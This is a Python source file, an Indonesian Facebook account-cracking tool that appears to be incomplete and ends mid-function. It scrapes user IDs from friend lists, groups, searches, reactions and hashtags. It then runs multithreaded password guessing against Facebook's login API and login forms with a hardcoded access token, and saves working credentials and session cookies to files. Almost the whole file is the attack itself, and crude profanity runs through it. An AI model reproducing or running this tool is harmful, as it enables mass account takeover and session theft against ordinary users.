# update Rabu 7 April 2021
# coded by Aap Afandi
# rekod mulu ngentod:v
# fb me : https://m.facebook.com/Kang.Pacman
# salam open source:v
import os,sys,re,json,random
from time import sleep as waktu
from shutil import rmtree as hapus
from concurrent.futures import ThreadPoolExecutor as Bool
ok=0
cp=0
cot=0
live=[]
chek=[]
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try:
	import requests as req
except ModuleNotFoundError:
	os.system("python -m pip install requests");restart()
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	os.system("python -m pip install bs4");restart()
uag="NokiaX3-00/2.0 (p) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
try:hapus("__pycache__")
except:pass
try:hapus("kentod/__pycache__")
except:pass
def hasil(ngocok,ismylife):
	if len(ngocok) != 0 or len(ismylife) != 0:
		print(f"\n\n[✓] \x1b[1;35mDone Bro\n\x1b[0m[*] \x1b[1;32mLIVE\x1b[0m/\x1b[1;33mCHEK \x1b[0m: \x1b[1;32m{len(ngocok)}\x1b[0m/\x1b[1;33m{len(ismylife)}\x1b[0m")
		if len(ngocok)==0:pass
		else:print("[*] \x1b[1;32mHasil Live Tersimpan Di File : live.txt\x1b[0m")
		if len(ismylife)==0:pass
		else:print("[*] \x1b[1;33mHasil Chek Tersimpan Di File : chek.txt")
		exit()
	else:exit("\n\n\x1b[1;31m[!] Tidak Mendapatkan Hasil:(")
yeahh=random.choice(["Aap Afandi ID","Kang Pacman"])
def logo():
	os.system("clear")
	print(f"""          ╔╦╗┌┐ ┌─┐  ╔═╗┌┐ v.1.0
          ║║║├┴┐├┤───╠╣ ├┴┐
          ╩ ╩└─┘└    ╚  └─┘
    -=[ Create By {yeahh} ]=-""")
class about:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
	def tentang(self):
		try:
			anjir=req.get(f"{self.url}/profile.php",cookies=kueh).text
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			exit("[!] Kesalahan Pada Koneksi")
		if "Facebook - Masuk atau Daftar" in anjir or "Masuk ke Facebook" in anjir or "Epsilon" in anjir:
			os.remove("cookie");exit("[!] Cookies Kedaluwarsa, Harap Login Ulang")
		else:
			logo()
			print("+"+"~"*40+"+")
			print(f"[*] Uid  : {tentang.get('uid')}")
			print(f"[*] Nama : {tentang.get('nama')}")
			if tentang.get("username") is None:
				print("+"+"~"*40+"+")
			else:
				print(f"[*] Username : {tentang.get('username')}")
				print("+"+"~"*40+"+")
			print("[01] Crack Dari Followers")
			print("[02] Crack Dari Daftar Teman")
			print("[03] Crack Dari Member Group")
			print("[04] Crack Dari Pencarian Nama")
			print("[05] Crack Dari Daftar Teman Target")
			print("[06] Crack Dari Permintaan Pertemanan")
			print("[07] Crack Dari Permintaan Terkirim")
			print("[08] Crack Dari Reaction Post")
			print("[09] Crack Dari Saran Teman")
			print("[10] Crack Dari Hashtag")
			print("[11] Menu Tambahan")
			print("[00] Keluar")
			print("+"+"~"*40+"+")
	def tentang_sc(self):
		print("""
[*] Author : Aap Afandi
[*] Github : https://github.com/KangPacman
[*] Facebook : https://m.facebook.com/Kang.Pacman
[*] WhatsApp : +6283805812588
[*] Script Name : mbf-fb
[*] Version : 1.0

[!] Jika Menemukan Bug Atau Error Di Script Silahkan Update/Laporkan Ke WhatsApp/Facebook Saya:)
""")
		input("[*] Enter Untuk Kembali Ke Menu > ")
class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def geh(gey):
					a=req.get(gey,cookies=kueh).text
					b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[AapAfandiGanteng]"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[AapAfandiGanteng]"+c[1])
							print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
					if "Lihat Postingan Lainnya" in a:
						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
		except:pass
	def teangan(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				elif "?refid=" in softek[1]:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				else:
					self.id.append(softek[1]+"[AapAfandiGanteng]"+softek[2])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Teman Lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "Semua 0" in kontol:
				print("[!] Tidak Ada Yang Menanggapi Postingan, Awokawokawok Kasian Akun Nya Sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def hastag(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ class\=\".."\ href\=\"(.*?)__tn__=C">(.*?)</a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					tol=re.search("profile.php\?id=(\\d*)",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[AapAfandiGanteng]"+softek[1])
				else:
					tol=re.search("/(.*?)\?",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.hastag(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def saran(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',kontol)
			if len(memek)!=0:
				for softek in memek:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
					print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
					if len(self.id)==jum:
						true=True
						break
			if true==False:
				if "Lihat selengkapnya" in kontol:
					self.saran(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		except:pass
	def menu(self):
		about().tentang()
		pilih=input("[?] Pilih : ")
		if pilih in["1","01"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.folower(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["2","02"]:
			self.babaturan(f"{self.url}/friends/center/friends/")
		elif pilih in["3","03"]:
			while True:
				kontol=input("[?] Masukkan Id Grup : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "Konten Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						else:
							print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
							print("[!] Tekan CTRL + C Jika Ingin Langsung Crack")
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["4","04"]:
			while True:
				kontol=input("[?] Nama : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f"[!] Pengguna Dengan Nama {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.teangan(f"{self.url}/search/people/?q={kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih in["5","05"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f"[!] Daftar Teman Tidak Di Publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.flrencang(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["6","06"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Permintaan" in ajg:
					print("[!] Permintaan Pertemanan Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["7","07"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/outgoing/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Saran" in ajg:
					print("[!] Tidak Ada Permintaan Terkirim Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					jumlah=int(input("[?] Jumlah : "))
					if "5000" in str(jumlah):
						jumlah-=1
					if jumlah<5001:
						self.saran(f"{self.url}/friends/center/requests/outgoing/#friends_center_main",jumlah)
					else: exit("[!] Max 5000 User")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
			except ValueError:
				exit("[!] Isi Yang Bener Ajg")
		elif pilih in["8","08"]:
			kontol=input("[?] Url/Id Postingan : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f"[!] Posting Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0].replace(";","&")
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except IndexError:
						print("[!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
			except req.exceptions.MissingSchema:
				print(f"[!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
		elif pilih in["9","09"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/suggestions",cookies=kueh).text
				if "Tidak Ada Saran" in ajg:
					print("[!] Tidak Ada Saran Teman");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					jumlah=int(input("[?] Jumlah : "))
					if "5000" in str(jumlah):
						jumlah-=1
					if jumlah<5001:
						self.saran(f"{self.url}/friends/center/suggestions",jumlah)
					else: exit("[!] Max 5000 User")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("[!] Kesalahan Pada Koneksi")
			except ValueError:
				exit("[!] Isi Yang Bener Ajg")
		elif pilih=="10":
			while True:
				kontol=input("[?] Hashtag : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg or "Halaman yang Anda minta tidak ditemukan." in ajg:
							print(f"[!] Hashtag {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
							print(f"[!] Postingan Dengan Hashtag {kontol} Disembunyikan Karna Melanggar Standar Komunitas Fb");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.hastag(f"{self.url}/hashtag/{kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih=="11":
			print("\n[L] Lihat Hasil Crack")
			print("[R] Laporkan Masalah")
			print("[U] Update Script")
			print("[H] Hapus Cookie")
			print("[I] Info Script")
			print("[B] Kembali")
			print("[K] Keluar\n")
			self.fuck()
		elif pilih in["0","00"]:
			exit("[*] Thank You For Using My Tool")
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");waktu(0.8);self.menu()
		else:
			print("[!] Pilihan Tidak Ada");self.menu()
		if len(self.id)!=0:
			print("")
			self.askk()
		else:
			print("[!] Gagal Mengambil ID, Silahkan Coba Lagi");waktu(1.5);self.menu()
	def fuck(self):
		pilih=input("[?] Pilih : ")
		if pilih in["l","L"]:
			tod=open("live.txt","r").read()
			tOd=open("chek.txt","r").read()
			if len(tod)==0 or "|" not in tod:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Live")
			else:
				print("\n\x1b[1;32m[Result Live]\n")
				print(tod)
			if len(tOd)==0 or "|" not in tOd:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Chek")
			else:
				print("\n\x1b[1;33m[Result Check]\n")
				print(tOd)
			exit()
		elif pilih in["r","R"]:
			print("[*] Silahkan Hubungi WhatsApp Saya 083805812588");os.system("xdg-open http://wa.me/+6283805812588?text=assalamualaikum");input("[*] Enter Untuk Kembali Ke Menu > ");waktu(2);self.menu()
		elif pilih in["u","U"]:
			os.system("git pull")
			exit()
		elif pilih in["h","H"]:
			try:os.remove("cookie")
			except:os.system("rm cookie")
			exit()
		elif pilih in["i","I"]:
			about().tentang_sc()
			self.menu()
		elif pilih in["b","B"]:
			self.menu()
		elif pilih in["k","K"]:
			exit("[*] Thank You For Using My Tool")
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");self.fuck()
		else:
			print("[!] Pilihan Tidak Ada");self.fuck()
	def askk(self):
		njir=input("[?] Ingin Menggunakan Password Manual Y/T : ")
		if njir in(""," "):
			print("[!] Jangan Kosong Bro");self.askk()
		elif njir in("y","Y"):
			print("[*] Contoh : name123,name12345")
			while True:
				pwek=input("[?] Password : ")
				if pwek in(""," "):
					print("[!] Jangan Kosong Bro")
				elif len(pwek)<=5:
					print("[!] Password Minimal 6 Karakter")
				else:
					def xhh(xss=None):
						pilih=input("[?] Pilih : ")
						if pilih in(""," "):
							print("[!] Jangan Kosong Bro");xhh()
						elif pilih in("1","01"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.crackapi,xi,xss)
									except: pass
							hasil(live,chek)
						elif pilih in("2","02"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://mbasic.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("3","03"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://m.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("4","04"):
							print("[!] Harap Untuk Tidak Menggunakan Vpn/wifi Ketika Menggunakan Metode Ini\n[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://free.facebook.com")
									except: pass
							hasil(live,chek)
						else:
							print("[!] Isi Yang Bener Ajg");xhh()
					print("    [ Pilih Metode Crack ]")
					print("[1] Metode b-api (Mode Crack Cepat)")
					print("[2] Metode mbasic (Mode Crack Lambat)")
					#print("[3] Metode m.facebook (Mode Crack Lambat)")
					#print("[4] Metode free.facebook (Mode Crack Lambat)")
					xhh(pwek.split(","))
					break
		elif njir in("t","T"):
			print("    [ Pilih Metode Crack ]")
			print("[1] Metode b-api (Mode Crack Cepat)")
			print("[2] Metode mbasic (Mode Crack Lambat)")
			#print("[3] Metode m.facebook (Mode Crack Lambat)")
			#print("[4] Metode free.facebook (Mode Crack Lambat)")
			self.ngontol()
		else:
			print("[!] Isi Yang Bener Ajg");self.askk()
	def crackapi(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("live.txt","r").read() or user in open("chek.txt","r").read():
				break
			else:
				ses=req.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param)
				if "session_key" in send.text and "EAAA" in send.text:
					ok+=1
					print(f"\r\x1b[1;32m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("live.txt","a").write(f"{user}|{pw}\n")
					live.append(f"{user}{pw}")
					break
				elif "www.facebook.com" in send.json()["error_msg"]:
					cp+=1
					print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("chek.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def modol(self,user,ox,beol,**kwargs):
		global ok,cp,cot
		for pw in ox:
			if user in open("live.txt","r").read() or user in open("chek.txt","r").read():
				break
			else:
				ses=req.Session()
				a=ses.get(f"{beol}/login/?next&ref=dbl&refid=8").text
				b=parser(a,"html.parser")
				for x in b.find_all("input"):
					if x.get("name")==None or "_fb_noscript" in x.get("name") or "sign_up" in x.get("name"):
						continue
					else:
						kwargs.update({x.get("name"):x.get("value")})
				kwargs.update({"email":user,"pass":pw})
				tol=beol+b.find("form",method="post").get("action")
				if "m.facebook.com" in beol:
					ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"x-fb-lsd":kwargs.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":uag,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","origin":beol,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
				else:
					if "mbasic.facebook.com" in beol:
						anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
					else:
						anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
					ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":anjg,"origin":beol,"user-agent":uag,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				ses.post(tol,data=kwargs,allow_redirects=False)
				if "c_user" in ses.cookies.get_dict().keys():
					ok+=1
					kuki=";".join([f"{key}={value}" for key,value in ses.cookies.get_dict().items()])
					print(f"\r\x1b[1;32m * ---> {user}|{pw}|{kuki}\x1b[0m\n",end="")
					open("live.txt","a").write(f"{user}|{pw}|{kuki}\n")
					live.append(f"{user}{pw}{kuki}")
					break
				elif "checkpoint" in ses.cookies.get_dict().keys():
					cp+=1
					print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
					open("chek.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def ngontol(self):
		nanya=input("[?] Pilih : ")
		if nanya in[""," "]:
			print("[!] Jangan Kosong Bro");self.ngontol()
		elif nanya in["1","01"]:
